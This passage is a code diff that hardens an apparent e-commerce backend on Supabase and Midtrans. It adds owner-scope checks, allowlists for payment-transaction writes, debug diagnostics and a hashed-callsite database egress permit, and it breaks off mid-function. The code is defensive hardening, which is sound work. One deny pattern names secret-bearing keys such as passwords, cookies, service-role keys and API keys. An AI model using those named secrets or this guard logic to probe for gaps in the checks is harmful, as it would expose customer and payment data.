+          request_shape: requestShapeV212,
+          protected_field_count: protectedFields.length,
+          protected_fields: protectedFields.map((key) => String(key || '').replace(/[^a-zA-Z0-9_.-]/g, '').slice(0, 60)).slice(0, 20)
+        });
         await diracCentralBanCurrentContextV146('service_role_protected_field').catch(() => null);
         return { block: true, reason: 'service_role_protected_field', status: 403 };
       }
@@ -27131,34 +35901,106 @@ async function diracCentralInspectServiceRoleAccessV146(path, options = {}) {
   return { ok: true };
 }
 
+function diracCentralIsInternalOwnerLookupV194(ctx, table, path, options, method) {
+  if (!ctx || ctx.__diracCentralOwnerLookupV194 !== true || method !== 'GET') return false;
+  if (options && options.body !== undefined && options.body !== null) return false;
+  if (!/^(orders|domain_orders|payment_transactions|security_customer_sessions|security_customer_recovery_codes)$/.test(String(table || ''))) return false;
+  const raw = String(path || '');
+  return raw.startsWith('/rest/v1/' + table + '?')
+    && /[?&]select=/.test(raw)
+    && /[?&]or=/.test(raw)
+    && /[?&]limit=80(?:&|$)/.test(raw);
+}
+
 async function diracCentralServiceRoleOwnerScopeGuardV146(ctx, path, body) {
   if (!ctx || ctx.classification === 'server') return { ok: true };
   if (ctx.__diracCentralOwnerScopeResolvingV146 === true) return { ok: true, guarded: 'owner_scope_internal_lookup' };
   const ids = diracCentralExtractServiceRoleScopeIdsV146(path, body);
-  if (!ids.customerIds.length && !ids.authUserIds.length && !ids.userIds.length) return { ok: true };
-  let owner = null;
-  ctx.__diracCentralOwnerScopeResolvingV146 = true;
-  try {
-    owner = await diracCentralResolveOwnerV146(ctx.req).catch(() => null);
-  } finally {
-    ctx.__diracCentralOwnerScopeResolvingV146 = false;
+  const scopeCounts = {
+    customer_id_count: ids.customerIds.length,
+    auth_user_id_count: ids.authUserIds.length,
+    user_id_count: ids.userIds.length,
+    object_value_count: ids.objectValues.length
+  };
+  if (!ids.customerIds.length && !ids.authUserIds.length && !ids.userIds.length && !ids.objectValues.length) return { ok: true };
+  let owner = typeof diracCentralOwnerFromVerifiedContextV215 === 'function'
+    ? diracCentralOwnerFromVerifiedContextV215(ctx.req)
+    : null;
+  if (!owner) {
+    ctx.__diracCentralOwnerScopeResolvingV146 = true;
+    try {
+      owner = await diracCentralResolveOwnerV146(ctx.req).catch((error) => {
+        ctx.ownerResolutionDebugV212 = {
+          patch: DIRAC_CENTRAL_OWNER_DEBUG_V212,
+          resolver: 'diracCentralResolveOwnerV146',
+          final_code: 'OWNER_RESOLVER_UNCAUGHT_EXCEPTION',
+          failure_point: 'diracCentralServiceRoleOwnerScopeGuardV146.resolve_owner',
+          error: diracCentralSafeDiagnosticErrorV212(error)
+        };
+        return null;
+      });
+    } finally {
+      ctx.__diracCentralOwnerScopeResolvingV146 = false;
+    }
   }
-  if (!owner || !owner.ok || !owner.customerIds || !owner.customerIds.length) return { ok: false, reason: 'service_role_owner_unavailable' };
+  if (!owner || !owner.ok || !owner.customerIds || !owner.customerIds.length) {
+    ctx.serviceRoleDebugV212 = {
+      patch: DIRAC_CENTRAL_OWNER_DEBUG_V212,
+      diagnostic_code: String(ctx.ownerResolutionDebugV212 && ctx.ownerResolutionDebugV212.final_code || owner && owner.reason || 'OWNER_UNAVAILABLE').slice(0, 160),
+      failure_point: String(ctx.ownerResolutionDebugV212 && ctx.ownerResolutionDebugV212.failure_point || 'diracCentralServiceRoleOwnerScopeGuardV146.owner_resolution').slice(0, 180),
+      owner_result: owner && owner.reason ? String(owner.reason).slice(0, 100) : 'owner_not_resolved',
+      scope_counts: scopeCounts
+    };
+    return { ok: false, reason: 'service_role_owner_unavailable' };
+  }
   const allowedCustomers = new Set(owner.customerIds.map(String));
-  if (ids.customerIds.some((id) => !allowedCustomers.has(id))) return { ok: false, reason: 'service_role_customer_scope_mismatch' };
+  if (ids.customerIds.some((id) => !allowedCustomers.has(id))) {
+    ctx.serviceRoleDebugV212 = {
+      patch: DIRAC_CENTRAL_OWNER_DEBUG_V212,
+      diagnostic_code: 'SERVICE_ROLE_CUSTOMER_SCOPE_MISMATCH',
+      failure_point: 'diracCentralServiceRoleOwnerScopeGuardV146.customer_scope',
+      scope_counts: scopeCounts,
+      resolved_customer_count: allowedCustomers.size
+    };
+    return { ok: false, reason: 'service_role_customer_scope_mismatch' };
+  }
   const expectedAuthUser = String(owner.authUserId || '').trim();
   const authIds = ids.authUserIds.concat(ids.userIds);
   if (authIds.length && (!expectedAuthUser || authIds.some((id) => id !== expectedAuthUser))) {
+    ctx.serviceRoleDebugV212 = {
+      patch: DIRAC_CENTRAL_OWNER_DEBUG_V212,
+      diagnostic_code: expectedAuthUser ? 'SERVICE_ROLE_AUTH_USER_SCOPE_MISMATCH' : 'SERVICE_ROLE_EXPECTED_AUTH_USER_MISSING',
+      failure_point: 'diracCentralServiceRoleOwnerScopeGuardV146.auth_user_scope',
+      scope_counts: scopeCounts,
+      expected_auth_user_present: Boolean(expectedAuthUser)
+    };
     return { ok: false, reason: 'service_role_auth_user_scope_mismatch' };
+  }
+  if (ids.objectValues.length) {
+    const approved = ctx.__diracCentralOwnerBoundObjectValuesV194;
+    if (!(approved instanceof Set) || ids.objectValues.some((value) => !approved.has(value))) {
+      ctx.serviceRoleDebugV212 = {
+        patch: DIRAC_CENTRAL_OWNER_DEBUG_V212,
+        diagnostic_code: approved instanceof Set ? 'SERVICE_ROLE_OBJECT_NOT_OWNER_BOUND' : 'SERVICE_ROLE_OWNER_BOUND_OBJECT_SET_MISSING',
+        failure_point: 'diracCentralServiceRoleOwnerScopeGuardV146.object_scope',
+        scope_counts: scopeCounts,
+        approved_object_count: approved instanceof Set ? approved.size : 0
+      };
+      return { ok: false, reason: 'service_role_object_scope_unbound' };
+    }
   }
   return { ok: true };
 }
 
 function diracCentralExtractServiceRoleScopeIdsV146(path, body) {
-  const out = { customerIds: [], authUserIds: [], userIds: [] };
+  const out = { customerIds: [], authUserIds: [], userIds: [], objectValues: [] };
   const add = (bucket, value) => {
     const clean = String(value || '').trim();
     if (diracCentralLooksLikeUuidV146(clean) && !out[bucket].includes(clean)) out[bucket].push(clean);
+  };
+  const addObject = (value) => {
+    const clean = String(value || '').trim();
+    if (/^[A-Za-z0-9._:@-]{1,160}$/.test(clean) && !/^(?:null|true|false)$/i.test(clean) && !out.objectValues.includes(clean)) out.objectValues.push(clean);
   };
   const raw = String(path || '');
   try {
@@ -27171,14 +36013,16 @@ function diracCentralExtractServiceRoleScopeIdsV146(path, body) {
         if (key === 'customer_id') add('customerIds', item);
         if (key === 'auth_user_id') add('authUserIds', item);
         if (key === 'user_id') add('userIds', item);
+        if (/^(id|order_id|order_code|domain_order_id|payment_id|transaction_id|invoice_id|gateway_reference|session_id|recovery_code_id)$/.test(key)) addObject(item);
       });
     }
-  } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   diracCentralFlattenObjectV146(body || {}, 0, '', 200).forEach((item) => {
     const key = String(item.key || '').split('.').pop().toLowerCase();
     if (key === 'customer_id') add('customerIds', item.value);
     if (key === 'auth_user_id') add('authUserIds', item.value);
     if (key === 'user_id') add('userIds', item.value);
+    if (/^(id|order_id|order_code|domain_order_id|payment_id|transaction_id|invoice_id|gateway_reference|session_id|recovery_code_id)$/.test(key)) addObject(item.value);
   });
   return out;
 }
@@ -27288,6 +36132,38 @@ function diracCentralIsCheckoutOwnerBootstrapServiceRoleV146(ctx, table, path, o
   return false;
 }
 
+function diracCentralIsCheckoutCustomerOwnerReadServiceRoleV196(ctx, table, path, options = {}, method) {
+  if (!ctx || (ctx.action !== 'checkout_order' && ctx.action !== 'create_payment') || !ctx.req || ctx.req.__diracCentralSecurityGuardPassedV146 !== true) return false;
+  if (String(table || '').toLowerCase() !== 'customers' || String(method || options.method || 'GET').toUpperCase() !== 'GET') return false;
+  if (options && options.body !== undefined && options.body !== null) return false;
+
+  const boundCustomerId = String(ctx.__diracCentralCheckoutOwnerCustomerIdV196 || '').trim();
+  const boundAuthUserId = String(ctx.__diracCentralCheckoutOwnerAuthUserIdV196 || '').trim();
+  if (!diracCentralLooksLikeUuidV146(boundCustomerId) || !diracCentralLooksLikeUuidV146(boundAuthUserId)) return false;
+
+  const rawPath = String(path || '');
+  const queryIndex = rawPath.indexOf('?');
+  if (queryIndex <= 0 || rawPath.slice(0, queryIndex) !== '/rest/v1/customers') return false;
+
+  let params;
+  try {
+    params = new URLSearchParams(rawPath.slice(queryIndex + 1));
+  } catch (_) {
+    return false;
+  }
+
+  const allowedKeys = new Set(['select', 'id', 'limit']);
+  const keys = Array.from(params.keys());
+  if (keys.length !== 3 || keys.some((key) => !allowedKeys.has(String(key || '')))) return false;
+  if (Array.from(allowedKeys).some((key) => params.getAll(key).length !== 1)) return false;
+  if (params.get('select') !== 'id,email,name,phone' || params.get('limit') !== '1') return false;
+
+  const idFilter = String(params.get('id') || '');
+  if (!idFilter.startsWith('eq.')) return false;
+  const requestedCustomerId = idFilter.slice(3).trim();
+  return diracCentralLooksLikeUuidV146(requestedCustomerId) && requestedCustomerId === boundCustomerId;
+}
+
 function diracCentralIsCheckoutOrderCreateServiceRoleV146(ctx, table, path, options = {}, method) {
   if (!ctx || ctx.action !== 'checkout_order' || !ctx.req || ctx.req.__diracCentralSecurityGuardPassedV146 !== true) return false;
   const cleanTable = String(table || '').toLowerCase();
@@ -27300,6 +36176,116 @@ function diracCentralIsCheckoutOrderCreateServiceRoleV146(ctx, table, path, opti
     return diracCentralCheckoutOrderItemRowsSafeV152(options.body);
   }
   return false;
+}
+
+
+// PATCH v199: create_payment may create and update only the payment transaction
+// generated inside the same fully guarded request. This is not a table/action
+// whitelist: customer, order and transaction identifiers must already be bound.
+function diracCentralIsCreatePaymentTransactionServiceRoleV199(ctx, table, path, options = {}, method) {
+  if (!ctx || ctx.action !== 'create_payment' || ctx.method !== 'POST') return false;
+  if (!ctx.req || ctx.req.__diracCentralSecurityGuardPassedV146 !== true) return false;
+  if (String(table || '').toLowerCase() !== 'payment_transactions') return false;
+
+  const cleanMethod = String(method || options.method || 'GET').toUpperCase();
+  const rawPath = String(path || '');
+  const boundCustomerId = String(ctx.__diracCentralCheckoutOwnerCustomerIdV196 || '').trim();
+  const boundObjects = ctx.__diracCentralOwnerBoundObjectValuesV194;
+  const expected = ctx.__diracCentralCreatePaymentExpectedV199;
+  if (!diracCentralLooksLikeUuidV146(boundCustomerId) || !(boundObjects instanceof Set)) return false;
+
+  if (cleanMethod === 'POST') {
+    if (rawPath !== '/rest/v1/payment_transactions') return false;
+    if (String(options.prefer || '') !== 'return=representation') return false;
+    const rows = Array.isArray(options.body) ? options.body : [options.body];
+    if (rows.length !== 1) return false;
+    const row = rows[0];
+    if (!row || typeof row !== 'object' || Array.isArray(row)) return false;
+    const allowed = new Set([
+      'customer_id', 'service_type', 'gateway_name', 'gateway_reference',
+      'payment_status', 'amount', 'currency', 'metadata', 'order_id', 'domain_order_id'
+    ]);
+    const keys = Object.keys(row);
+    if (!keys.length || keys.some((key) => !allowed.has(String(key || '').toLowerCase()))) return false;
+
+    const customerId = String(row.customer_id || '').trim();
+    const orderId = String(row.order_id || '').trim();
+    const domainOrderId = String(row.domain_order_id || '').trim();
+    const objectId = orderId || domainOrderId;
+    if (!expected || typeof expected !== 'object') return false;
+    if (customerId !== boundCustomerId || customerId !== String(expected.customerId || '')) return false;
+    if (Boolean(orderId) === Boolean(domainOrderId)) return false;
+    if (!diracCentralLooksLikeUuidV146(objectId) || !boundObjects.has(objectId) || objectId !== String(expected.objectId || '')) return false;
+    if (String(expected.kind || '') === 'regular' ? !orderId || !!domainOrderId : !domainOrderId || !!orderId) return false;
+    if (String(row.service_type || '').trim() !== String(expected.serviceType || '')) return false;
+    if (String(row.gateway_name || '').trim().toLowerCase() !== 'midtrans') return false;
+    const gatewayReference = String(row.gateway_reference || '').trim();
+    const expectedReferencePrefix = String(expected.kind || '') === 'domain' ? 'PAY-DOM-' : 'PAY-ORD-';
+    if (!/^[A-Za-z0-9._:@-]{3,120}$/.test(gatewayReference) || !gatewayReference.startsWith(expectedReferencePrefix)) return false;
+    if (String(row.payment_status || '').trim().toLowerCase() !== 'unpaid') return false;
+    if (!Number.isFinite(Number(row.amount)) || Number(row.amount) !== Number(expected.amount)) return false;
+    if (String(row.currency || '').trim().toUpperCase() !== 'IDR') return false;
+    if (!diracCentralCreatePaymentMetadataSafeV199(row.metadata, 'insert')) return false;
+    const metadata = row.metadata || {};
+    if (String(metadata.order_kind || '') !== String(expected.kind || '')) return false;
+    if (String(metadata.order_code || '') !== String(expected.orderCode || '')) return false;
+    if (String(metadata.amount_source || '') !== String(expected.amountSource || '')) return false;
+    if (Number(metadata.item_total) !== Number(expected.amount)) return false;
+    if (metadata.frontend_amount_ignored !== true || metadata.frontend_invoice_storage_trusted !== false) return false;
+    const startedAtMs = Date.parse(String(metadata.create_payment_started_at || ''));
+    if (!Number.isFinite(startedAtMs) || Math.abs(Date.now() - startedAtMs) > 10 * 60 * 1000) return false;
+    return true;
+  }
+
+  if (cleanMethod === 'PATCH') {
+    if (options.body === undefined || options.body === null || Array.isArray(options.body)
+        || typeof options.body !== 'object') return false;
+    const queryIndex = rawPath.indexOf('?');
+    if (queryIndex <= 0 || rawPath.slice(0, queryIndex) !== '/rest/v1/payment_transactions') return false;
+    let params;
+    try { params = new URLSearchParams(rawPath.slice(queryIndex + 1)); } catch (_) { return false; }
+    if (Array.from(params.keys()).length !== 1 || params.getAll('id').length !== 1) return false;
+    const idFilter = String(params.get('id') || '');
+    if (!idFilter.startsWith('eq.')) return false;
+    const transactionId = idFilter.slice(3).trim();
+    if (!diracCentralLooksLikeUuidV146(transactionId) || !boundObjects.has(transactionId)) return false;
+
+    const keys = Object.keys(options.body);
+    if (!keys.length || keys.some((key) => !/^(payment_url|metadata)$/.test(String(key || '').toLowerCase()))) return false;
+    if (!Object.prototype.hasOwnProperty.call(options.body, 'metadata')) return false;
+    if (!diracCentralCreatePaymentMetadataSafeV199(options.body.metadata, 'patch')) return false;
+    if (Object.prototype.hasOwnProperty.call(options.body, 'payment_url')) {
+      let paymentUrl;
+      try { paymentUrl = new URL(String(options.body.payment_url || '')); } catch (_) { return false; }
+      if (paymentUrl.protocol !== 'https:' || !/^(?:app\.)?(?:sandbox\.)?midtrans\.com$/i.test(paymentUrl.hostname)) return false;
+      if (paymentUrl.username || paymentUrl.password || (paymentUrl.port && paymentUrl.port !== '443')) return false;
+    }
+    return true;
+  }
+
+  return false;
+}
+
+function diracCentralCreatePaymentMetadataSafeV199(metadata, phase) {
+  if (!metadata || typeof metadata !== 'object' || Array.isArray(metadata)) return false;
+  const keys = Object.keys(metadata);
+  if (keys.length > 24) return false;
+  if (keys.some((key) => /password|authorization|service_role|server_key|private_key|secret|cookie|apikey|api_key/i.test(String(key || '')))) return false;
+  if (String(phase || '') === 'insert') {
+    const allowed = new Set([
+      'order_kind', 'order_code', 'order_status', 'amount_source', 'item_total',
+      'create_payment_started_at', 'frontend_amount_ignored',
+      'frontend_invoice_storage_trusted', 'owner_source'
+    ]);
+    if (keys.some((key) => !allowed.has(String(key || '')))) return false;
+  }
+  try {
+    const encoded = JSON.stringify(metadata);
+    if (!encoded || Buffer.byteLength(encoded, 'utf8') > 128 * 1024) return false;
+  } catch (_) {
+    return false;
+  }
+  return true;
 }
 
 function diracCentralCheckoutOrderRowsSafeV146(body) {
@@ -27554,26 +36540,573 @@ function diracCentralBodyRowsSafeV146(body, allowedKeys, validateRow) {
 }
 
 function diracCentralBlockedSupabaseResultV146(decision) {
+  const ctx = diracCentralCurrentContextV149();
+  const data = {
+    ok: false,
+    code: 'CENTRAL_SECURITY_SERVICE_ROLE_BLOCKED',
+    message: 'Permintaan ditolak oleh sistem keamanan.',
+    request_id: String(ctx && ctx.requestId || '').slice(0, 64),
+    failure_id: diracCentralFailureIdV211(ctx)
+  };
+  if (diracCentralDebugResponseAllowedV211(ctx)) {
+    data.debug = {
+      patch: DIRAC_CENTRAL_OWNER_DEBUG_V212,
+      reason: String(decision && decision.reason || 'service_role_blocked').slice(0, 120),
+      service_role: ctx && ctx.serviceRoleDebugV212 || undefined,
+      owner_resolution: ctx && ctx.ownerResolutionDebugV212 || undefined
+    };
+  }
   return {
     ok: false,
     status: Number(decision && decision.status || 403),
-    data: { ok: false, code: 'CENTRAL_SECURITY_SERVICE_ROLE_BLOCKED', message: 'Permintaan ditolak oleh sistem keamanan.' },
+    data,
     error: 'CENTRAL_SECURITY_SERVICE_ROLE_BLOCKED'
   };
 }
 
+function diracCentralHeaderObjectV230(headers) {
+  const out = Object.create(null);
+  if (!headers) return out;
+  if (typeof headers.forEach === 'function') headers.forEach((value, key) => { out[String(key).toLowerCase()] = String(value); });
+  else Object.entries(headers).forEach(([key, value]) => { out[String(key).toLowerCase()] = Array.isArray(value) ? value.join(', ') : String(value); });
+  return out;
+}
+
+function diracCentralBodyBytesV230(body) {
+  if (body === undefined || body === null) return Buffer.alloc(0);
+  if (Buffer.isBuffer(body)) return Buffer.from(body);
+  if (body instanceof Uint8Array) return Buffer.from(body);
+  if (body instanceof ArrayBuffer) return Buffer.from(new Uint8Array(body));
+  if (typeof body === 'string') return Buffer.from(body, 'utf8');
+  if (body && body.constructor && body.constructor.name === 'URLSearchParams') return Buffer.from(body.toString(), 'utf8');
+  throw Object.assign(new Error('DIRAC_EGRESS_BODY_TYPE_UNSUPPORTED'), { code: 'DIRAC_EGRESS_BODY_TYPE_UNSUPPORTED' });
+}
+
+const DIRAC_CENTRAL_DATABASE_TABLES_V230 = Object.freeze(new Set([
+  'admin_users',
+  'customers',
+  'dirac_persistent_bans',
+  'dirac_s2s_security',
+  'domain_order_items',
+  'domain_orders',
+  'domain_passkeys',
+  'domain_tld_prices',
+  'order_items',
+  'orders',
+  'payment_gateway_events',
+  'payment_transactions',
+  'products',
+  'security_customer_access_blocks',
+  'security_customer_account_requests',
+  'security_customer_auth_links',
+  'security_customer_events',
+  'security_customer_login_logs',
+  'security_customer_password_hashes',
+  'security_customer_recovery_codes',
+  'security_customer_sessions',
+  'security_customer_settings',
+  'security_lost_passkey_recovery_requests',
+  'security_lost_passkey_recovery_sessions',
+  'voucher_tiers'
+]));
+const DIRAC_CENTRAL_DATABASE_RPCS_V230 = Object.freeze(new Set([
+  'dirac_central_atomic_consume_v230',
+  'dirac_central_atomic_claim_record_v230',
+  'dirac_central_atomic_rate_limit_v230',
+  'dirac_central_security_log_v230',
+  'dirac_passkey_create_pending_v237',
+  'dirac_passkey_finalize_rotation_v237',
+  'dirac_passkey_record_assertion_v237',
+  'dirac_passkey_revoke_clone_v237'
+]));
+const DIRAC_CENTRAL_DATABASE_RPC_ACTIONS_V230 = Object.freeze(Object.assign(Object.create(null), {
+  dirac_passkey_create_pending_v237: 'dirac_mfa_passkey_verify',
+  dirac_passkey_finalize_rotation_v237: 'dirac_mfa_passkey_verify',
+  dirac_passkey_record_assertion_v237: 'dirac_mfa_passkey_verify',
+  dirac_passkey_revoke_clone_v237: 'dirac_mfa_passkey_verify'
+}));
+const DIRAC_CENTRAL_DATABASE_QUERY_KEYS_V230 = Object.freeze(new Set([
+  'select', 'order', 'limit', 'offset', 'on_conflict', 'or', 'and'
+]));
+
+function diracCentralEffectiveActionV230(ctx) {
+  const direct = String(ctx && ctx.action || '').trim().toLowerCase();
+  if (direct && (DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.has(direct) || DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(direct))) return direct;
+  const raw = String(ctx && ctx.rawAction || '').trim().toLowerCase();
+  if (!raw) return '';
+  const format = diracCentralValidateActionFormatV146(raw, raw);
+  if (!format.ok) return '';
+  const alias = diracCentralNormalizeAliasV146(raw);
+  if (!alias.ok) return '';
+  return DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.has(alias.action) || DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(alias.action)
+    ? alias.action
+    : '';
+}
+
+function diracCentralDatabaseAuthRouteAllowedV230(action, url, method, authMode) {
+  const path = String(url.pathname || '');
+  const verb = String(method || 'GET').toUpperCase();
+  const active = Boolean(action && (DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.has(action) || DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(action)));
+  if (!active) return false;
+  if (path === '/auth/v1/signup') return verb === 'POST' && authMode === 'anon' && action === 'domain_register' && url.search === '';
+  if (path === '/auth/v1/token') {
+    if (verb !== 'POST' || authMode !== 'anon' || Array.from(url.searchParams.keys()).some((key) => key !== 'grant_type') || url.searchParams.getAll('grant_type').length !== 1) return false;
+    const grant = String(url.searchParams.get('grant_type') || '');
+    if (grant === 'password') return /^(?:domain_login|domain_register)$/.test(action) || /(?:recovery|password|passkey|customer_security)/.test(action);
+    if (grant === 'refresh_token') return action !== 'domain_health' && action !== 'hostinger_check' && action !== 'domain_check';
+    return false;
+  }
+  if (path === '/auth/v1/user') return ['GET', 'PUT'].includes(verb) && url.search === '' && action !== 'domain_health' && action !== 'hostinger_check' && action !== 'domain_check';
+  if (path === '/auth/v1/admin/users' || /^\/auth\/v1\/admin\/users\/[0-9a-f-]{36}$/i.test(path)) {
+    if (authMode !== 'service' || !['GET', 'POST', 'PUT', 'DELETE'].includes(verb)) return false;
+    if (Array.from(url.searchParams.keys()).some((key) => key !== 'email') || url.searchParams.getAll('email').length > 1) return false;
+    return /^(?:domain_register|domain_login)$/.test(action) || /(?:admin|customer_security|recovery|password|passkey)/.test(action);
+  }
+  return false;
+}
+
+function diracCentralDatabaseRestRouteAllowedV230(action, url, method, authMode) {
+  const match = /^\/rest\/v1\/([a-z][a-z0-9_]*)$/.exec(String(url.pathname || ''));
+  if (!match || !DIRAC_CENTRAL_DATABASE_TABLES_V230.has(match[1])) return false;
+  if (!action || !(DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.has(action) || DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(action))) return false;
+  if (!['GET', 'HEAD', 'POST', 'PUT', 'PATCH', 'DELETE'].includes(String(method || '').toUpperCase())) return false;
+  if (!['service', 'anon'].includes(authMode)) return false;
+  if (String(url.search || '').length > 16384) return false;
+  const seen = new Set();
+  for (const [key, value] of url.searchParams.entries()) {
+    if (seen.has(key)) return false;
+    seen.add(key);
+    if (!DIRAC_CENTRAL_DATABASE_QUERY_KEYS_V230.has(key) && !/^[a-z][a-z0-9_]{0,62}$/.test(key)) return false;
+    if (String(value).length > 8192 || /[\r\n\0]/.test(String(value))) return false;
+  }
+  if (url.searchParams.has('on_conflict') && String(method || '').toUpperCase() !== 'POST') return false;
+  return true;
+}
+
+function diracCentralDatabaseRpcRouteAllowedV230(action, url, method, authMode) {
+  const match = /^\/rest\/v1\/rpc\/([a-z][a-z0-9_]*)$/.exec(String(url.pathname || ''));
+  if (!match || !DIRAC_CENTRAL_DATABASE_RPCS_V230.has(match[1])) return false;
+  if (String(method || '').toUpperCase() !== 'POST' || authMode !== 'service' || url.search !== '') return false;
+  const rpc = match[1];
+  const requiredAction = Object.prototype.hasOwnProperty.call(DIRAC_CENTRAL_DATABASE_RPC_ACTIONS_V230, rpc)
+    ? DIRAC_CENTRAL_DATABASE_RPC_ACTIONS_V230[rpc]
+    : '';
+  if (requiredAction && action !== requiredAction) return false;
+  return Boolean(action && (DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.has(action) || DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(action)));
+}
+
+function diracCentralDatabasePathPolicyV230(ctx, path, options) {
+  const cleanPath = String(path || '');
+  const source = options && typeof options === 'object' ? options : {};
+  const method = String(source.method || 'GET').toUpperCase();
+  const authMode = source.auth === 'service' ? 'service' : 'anon';
+  const action = diracCentralEffectiveActionV230(ctx);
+  if (!action || !cleanPath.startsWith('/') || cleanPath.startsWith('//') || cleanPath.includes('\\') || /[\r\n\0]/.test(cleanPath) || cleanPath.length > 24576) {
+    return { ok: false, reason: 'database_route_format_invalid' };
+  }
+  let url;
+  try { url = new URL(cleanPath, 'https://dirac-database.invalid'); } catch (_) { return { ok: false, reason: 'database_route_url_invalid' }; }
+  if (url.origin !== 'https://dirac-database.invalid' || /%(?:2f|5c|00|0d|0a)/i.test(url.pathname)) return { ok: false, reason: 'database_route_canonical_invalid' };
+  const allowed = diracCentralDatabaseRpcRouteAllowedV230(action, url, method, authMode)
+    || diracCentralDatabaseAuthRouteAllowedV230(action, url, method, authMode)
+    || diracCentralDatabaseRestRouteAllowedV230(action, url, method, authMode);
+  return allowed
+    ? { ok: true, action, authMode, method, canonicalPath: url.pathname + url.search }
+    : { ok: false, reason: 'database_route_not_allowlisted' };
+}
+
+function diracCentralCurrentDatabaseEgressPermitV230() {
+  try {
+    return DIRAC_CENTRAL_DATABASE_EGRESS_CONTEXT_V230 && DIRAC_CENTRAL_DATABASE_EGRESS_CONTEXT_V230.getStore() || null;
+  } catch (_) {
+    return null;
+  }
+}
+
+
+function diracCentralDatabaseCallsiteRegistryV230() {
+  const source = require('fs').readFileSync(__filename, 'utf8').split(/\r?\n/);
+  const entries = new Map();
+  for (let index = 0; index < source.length; index += 1) {
+    const line = source[index];
+    if (!/\bsupabaseFetch\s*\(/.test(line)
+        || /(?:async\s+function\s+supabaseFetch\s*\(|supabaseFetch\s*=\s*async\s+function)/.test(line)) continue;
+    const normalized = String(line || '').trim();
+    entries.set(index + 1, crypto.createHash('sha256').update(normalized).digest('hex'));
+  }
+  return entries;
+}
+const DIRAC_CENTRAL_DATABASE_CALLSITES_V230 = diracCentralDatabaseCallsiteRegistryV230();
+const DIRAC_CENTRAL_DATABASE_CALLSITES_HASH_V230 = crypto.createHash('sha256')
+  .update(Array.from(DIRAC_CENTRAL_DATABASE_CALLSITES_V230.entries()).map(([line, hash]) => line + ':' + hash).join('|'))
+  .digest('hex');
+
+function diracCentralDatabaseCallerEvidenceV230() {
+  const stack = String(new Error('DIRAC_DATABASE_CALLSITE').stack || '').split('\n').slice(1);
+  for (const frame of stack) {
+    const match = /\((.*):(\d+):(\d+)\)$/.exec(frame) || /\bat (.*):(\d+):(\d+)$/.exec(frame);
+    if (!match) continue;
+    const filename = String(match[1] || '').replace(/^file:\/\//, '');
+    const line = Number(match[2] || 0);
+    if (filename !== __filename || !DIRAC_CENTRAL_DATABASE_CALLSITES_V230.has(line)) continue;
+    return Object.freeze({ line, hash: DIRAC_CENTRAL_DATABASE_CALLSITES_V230.get(line) });
+  }
+  return null;
+}
+
+function diracCentralCreateDatabaseEgressPermitV230(ctx, op, callerEvidence) {
+  const cleanPath = String(op && op.path || '');
+  const caller = callerEvidence && typeof callerEvidence === 'object' ? callerEvidence : null;
+  if (!caller || !Number.isSafeInteger(Number(caller.line))
+      || DIRAC_CENTRAL_DATABASE_CALLSITES_V230.get(Number(caller.line)) !== String(caller.hash || '')) return null;
+  const options = op && op.options && typeof op.options === 'object' ? op.options : {};
+  const route = diracCentralDatabasePathPolicyV230(ctx, cleanPath, options);
+  if (!route.ok) return null;
+  const targetKey = resolveDiracSupabaseTargetKey(cleanPath, options);
+  const target = readDiracSupabaseCredentials(targetKey);
+  let origin;
+  try { origin = new URL(String(target.url || '')).origin; } catch (_) { return null; }
+  const apiKey = route.authMode === 'service' ? target.serviceKey : target.anonKey;
+  const bearer = String(options.bearer || apiKey || '');
+  let serializedBody = '';
+  try { serializedBody = options.body === undefined ? '' : JSON.stringify(options.body); } catch (_) { return null; }
+  const bodyBytes = Buffer.byteLength(serializedBody, 'utf8');
+  if (bodyBytes > 16 * 1024 * 1024) return null;
+  return Object.freeze({
+    action: route.action,
+    caller: String(ctx && ctx.classification || ''),
+    callerLine: Number(caller.line),
+    callerHash: String(caller.hash),
+    authMode: route.authMode,
+    origin,
+    path: route.canonicalPath,
+    method: route.method,
+    bodyBytes,
+    bodyHash: crypto.createHash('sha256').update(serializedBody).digest('hex'),
+    apiKeyHash: crypto.createHash('sha256').update(String(apiKey || '')).digest('hex'),
+    bearerHash: crypto.createHash('sha256').update(bearer).digest('hex'),
+    expiresAtMs: Date.now() + 30000
+  });
+}
+
+
+function diracCentralDatabaseEgressPermitMatchesV230(url, method, ctx, options) {
+  const permit = diracCentralCurrentDatabaseEgressPermitV230();
+  if (!permit || Date.now() > Number(permit.expiresAtMs || 0)) return false;
+  const effectiveAction = diracCentralEffectiveActionV230(ctx);
+  const effectiveCaller = String(ctx && ctx.classification || '');
+  if (permit.action !== effectiveAction || permit.caller !== effectiveCaller) return false;
+  if (!Number.isSafeInteger(Number(permit.callerLine))
+      || DIRAC_CENTRAL_DATABASE_CALLSITES_V230.get(Number(permit.callerLine)) !== String(permit.callerHash || '')) return false;
+  if (String(url.origin) !== permit.origin || String(url.pathname) + String(url.search) !== permit.path || String(method).toUpperCase() !== permit.method) return false;
+  const route = diracCentralDatabasePathPolicyV230(ctx, permit.path, { method: permit.method, auth: permit.authMode });
+  if (!route.ok || route.action !== permit.action || route.authMode !== permit.authMode) return false;
+  let body;
+  try { body = diracCentralBodyBytesV230(options && options.body); } catch (_) { return false; }
+  if (body.length !== permit.bodyBytes || crypto.createHash('sha256').update(body).digest('hex') !== permit.bodyHash) return false;
+  const headers = diracCentralHeaderObjectV230(options && options.headers);
+  if (crypto.createHash('sha256').update(String(headers.apikey || '')).digest('hex') !== permit.apiKeyHash) return false;
+  const bearer = String(headers.authorization || '').replace(/^Bearer\s+/i, '');
+  if (crypto.createHash('sha256').update(bearer).digest('hex') !== permit.bearerHash) return false;
+  return true;
+}
+
+
+function diracCentralEgressRouteAllowedV228(url, method, ctx, options) {
+  const host = String(url && url.hostname || '').toLowerCase();
+  const path = String(url && url.pathname || '');
+  const verb = String(method || 'GET').toUpperCase();
+  const action = diracCentralEffectiveActionV230(ctx);
